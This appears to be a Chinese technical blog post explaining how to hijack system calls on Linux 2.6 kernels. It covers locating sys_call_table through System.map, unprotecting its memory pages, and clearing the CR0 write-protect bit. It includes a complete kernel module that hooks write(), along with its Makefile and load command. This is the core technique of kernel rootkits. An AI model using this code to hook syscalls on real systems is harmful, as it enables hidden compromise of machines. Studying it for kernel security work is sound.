---
layout: post
title: "syscall hijacking:kernel 2.6 systems"
description: ""
category: 技术研究
tags: [kernel]
---
{% include JB/setup %}

这篇文章会详细的介绍如何劫持系统调用.文章中讨论的重点是如何绕过内核的保护和cpu的"保护模式".

## 访问系统调用表 ##

内核版本2.4以前的rootkit在2.6及以上的内核里是无法运行的.这是因为2.6以后,"sys_call_table"无法导出了,也就没有办法直接访问到.而且"sys_call_table"所在的内存页具有写保护,下面这种方式也是没法访问的:


	extern void *sys_call_table[];
	...
	sys_call_table[__NR_syscall] = pointer

不过这个表终归是在内存里,只要我们知道了它的内存地址,就可以通过一个简单的指针直接访问.有很多种办法可以获取到这个地址,最简单的就是查找"/boot"目录下的"System.map"文件了.这个文件是内核编译的时候创建的,它包含了内核使用的所有代号和想对应的地址.

这个文件的内容大致如下:

	spaccio@spaccio-laptop:~$ cat /boot/System.map-2.6.35-23-generic
	...
	c018d140 t cgroup_remount
	c018d260 T cgroup_path
	c018d310 t allocate_cg_links
	c018d410 t find_css_set
	c018d7d0 T cgroup_attach_task
	c018da40 T cgroup_clone
	c018dcc0 t cgroup_tasks_write
	c018dd90 t cgroup_release_agent
	c018df50 t proc_cgroup_show
	c018e180 t cgroup_pidlist_find
	c018e320 t cgroup_write_event_control
	c018e610 t pidlist_allocate
	c018e640 t pidlist_array_load
	...


内容很多,不过我们只对"sys_call_table"的内容感兴趣:

	spaccio@spaccio-laptop:~$ cat /boot/System.map-2.6.35-23-generic | grep sys_call_table
	c05d2180 R sys_call_table

## 绕过内核的写保护 ##

现在我们得到了系统调用表的地址,不过如果大家细心的话会发现"grep"命令的输出中有一个"R"的标志,它代表了这个地址是"只读的".

事实上内核在这个只读的区域内存储了一些结构,这样子就可以防止这些结构被修改而导致系统的不稳定.所以我们想要修改这些结构的话首先要把它设置成"读写"模式.

幸运的是内核已经给我们提供了一个特殊的函数来完成这个任务:

	void (*pages_rw)(struct page *page, int numpages) =  (void *) 0xc012fbb0;
	void (*pages_ro)(struct page *page, int numpages) =  (void *) 0xc012fe80;

"pages\_rw"函数设置页面为写模式, "page\_ro"设置页面为读模式.但是这两个函数的参数为页面的虚拟地址.我们可以使用"virt\_to\_page()"这个函数.这个函数可以把内核访问的页面物理地址转换为页面的虚拟地址.为了使用这两个函数,我们首先也需要知道他们的地址.可以从"System.map"文件读取:


	spaccio@spaccio-laptop:~$ cat /boot/System.map-2.6.35-23-generic | grep -e pages_rw -e pages_ro
	c012fbb0 T set_pages_rw
	c012fe80 T set_pages_ro

现在我们就可以通过这种方式来修改"sys_call_table"了

	...
	 
	unsigned long *syscall_table = (unsigned long *)0xc05d2180; 
	 
	...
	 
	void (*pages_rw)(struct page *page, int numpages) =  (void *) 0xc012fbb0;
	void (*pages_ro)(struct page *page, int numpages) =  (void *) 0xc012fe80;
	 
	...
	 
	static int init(void)
	{
	 
	    struct page *_sys_call_page;
	    printk(KERN_ALERT "\nHIJACK INIT\n");
	 
	    _sys_call_page = virt_to_page(&syscall_table);
	 
	    pages_rw(_sys_call_page, 1);
	     
	    // now we can use the sys_call_table
	     
	    ...
	}   


下面是一个样例的代码.(hijack.c)

	#include <linux/init.h>
	#include <linux/module.h>
	#include <linux/kernel.h> 
	#include <linux/errno.h> 
	#include <linux/types.h>
	#include <linux/unistd.h>
	#include <asm/cacheflush.h>  
	#include <asm/page.h>  
	#include <asm/current.h>
	#include <linux/sched.h>
	#include <linux/kallsyms.h>
	 
	unsigned long *syscall_table = (unsigned long *)0xc05d2180; 
	 
	void (*pages_rw)(struct page *page, int numpages) =  (void *) 0xc012fbb0;
	void (*pages_ro)(struct page *page, int numpages) =  (void *) 0xc012fe80;
	 
	asmlinkage int (*original_write)(unsigned int, const char __user *, size_t);
	 
	asmlinkage int new_write(unsigned int fd, const char __user *buf, size_t count) {
	 
	    // hijacked write
	 
	    printk(KERN_ALERT "WRITE HIJACKED");
	 
	    return (*original_write)(fd, buf, count);
	}
	 
	static int init(void) {
	 
	    struct page *sys_call_page_temp;
	 
	    printk(KERN_ALERT "\nHIJACK INIT\n");
	 
	    sys_call_page_temp = virt_to_page(&syscall_table);
	    pages_rw(sys_call_page_temp, 1);
	 
	    original_write = (void *)syscall_table[__NR_write];
	    syscall_table[__NR_write] = new_write;  
	 
	    return 0;
	}
	 
	static void exit(void) {
	 
	    struct page *sys_call_page_temp;
	    
	    sys_call_page_temp = virt_to_page(syscall_table);
	    syscall_table[__NR_write] = original_write;  
	    pages_ro(sys_call_page_temp, 1);
	     
	    printk(KERN_ALERT "MODULE EXIT\n");
	 
	    return;
	}
	 
	module_init(init);
	module_exit(exit);

(((这个方法在ubuntu12.04 Linux litsand-VirtualBox 3.2.0-45-generic-pae #70-Ubuntu SMP Wed May 29 20:31:05 UTC 2013 i686 i686 i386 GNU/Linux 测试失败.centos 5.4上system.map直接没有这两个函数的地址 )))

下面是对应的Makefile文件:

	obj-m   := hijack.o
	 
	KDIR    := /lib/modules/$(shell uname -r)/build
	PWD    := $(shell pwd)
	 
	default:
	    $(MAKE) -C $(KDIR) SUBDIRS=$(PWD) modules


可以通过一下命令加载模块:

	spaccio@spaccio-laptop:~$ sudo insmod hijack.ko
	
	
## 绕过CR0保护 ##

有些cpu会把CR(control register)设置成0,代表这保护模式.这种保护模式最早出现在intel的80286上.这个标志位也叫做wp-bit.可以通过一下方式来验证.

	spaccio@spaccio-laptop:~$ cat /proc/cpuinfo | grep wp
	wp      : yes
	wp      : yes

详细的CR0资料可以参考[wiki](http://en.wikipedia.org/wiki/Control_register#CR0).如果WP设置为1,那么cpu是写保护模式.设置为0的时候是读写模式.

如果cpu处于写保护模式,那么我们尝试加载"hijack.ko"模块的时候,内核把它结束掉.

	spaccio@spaccio-laptop:~$ sudo insmod hijack.ko
	Killed
	
所以我们把这个标志位设置为0就可以读写内存页面了(包括系统调用表).内核里提供了如下函数修改CR0


#define read_cr0 () (native_read_cr0 ())
#define write_cr0 (x) (native_write_cr0 (x))

这两个native read/write函数的定义如下:

	static inline unsigned long native_read_cr0 (void)
	{
	         unsigned long val;
	         asm volatile("movl %%cr0,%0\n\t" :"=r" (val));
	         return val;
	}
	 
	static inline void native_write_cr0 (unsigned long val)
	{
	         asm volatile("movl %0,%%cr0": :"r" (val));
	}

"read_cr0"函数返回寄存器CR0的值,"write_cr0"函数设置这个寄存器的值.
